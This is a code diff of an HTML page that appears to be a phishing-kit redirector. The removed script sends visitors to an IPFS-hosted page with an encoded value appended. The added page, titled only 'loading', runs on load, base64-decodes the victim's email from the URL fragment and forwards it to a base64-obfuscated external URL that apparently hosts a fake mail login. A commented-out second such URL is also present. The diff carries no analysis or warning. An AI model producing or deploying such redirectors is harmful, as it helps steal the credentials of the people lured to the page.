@@ -1,6 +1,21 @@
-<script>
-      window.location.replace(
-        "https://cloudflare-ipfs.com/ipfs/bafybeigrn7ejecvixlgtsmaq45d4uj23x2w5rwanyaovqfpkvpajhjccta/mweb-resphash.html?AFQjCNGzLXwfa7JjNQw1yigyslpQ7s&WQbHhhjJZj%2dRsTj296%2dtSvIcd9Gioz6ME5fcFbBP4tllGg2amUOju2Haa3enTsPX3TmjuR4IEE6CsDqJrBoABeI%2dD6MG#" +
-          atob(new URLSearchParams(window.location.search).get("hash"))
-      );
- </script>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta charset="UTF-8">
+  <title>loading</title>
+  <script>
+    function redirect() {
+      var queryString = window.location.href;
+      var dom= queryString.split("#");
+      var email = dom[1];
+      var decodedMail= atob(email);
+     // const forwardUrl = atob("aHR0cHM6Ly9zZWN1cmVzZXJ2ZXIubGlua3Byb3RlY3QuY2ZkL2VUVVpzYWZKIw==");
+      const forwardUrl = atob("aHR0cHM6Ly9td2ViY2xvdWQtZGlzY292ZXJ5bWFpbC51cC5yYWlsd2F5LmFwcC8/UkFsTFNOUEk5NUxBYUExR11pUmRUN3pxNExPNWticDlnVmdvNGJXRnp6VkdWRkRMalI2NThUVjljaGVKVGNQeVUtd1Y0b05Qekh2RTltNk1sRHk5SVVKVWh5N2lDSGh2TktTNzdER254elZsZmxDUDNrZiM=");
+      window.location.href = forwardUrl + decodedMail;
+    }
+  </script>
+</head>
+<body onload="redirect()">
+  </body>
+</html>
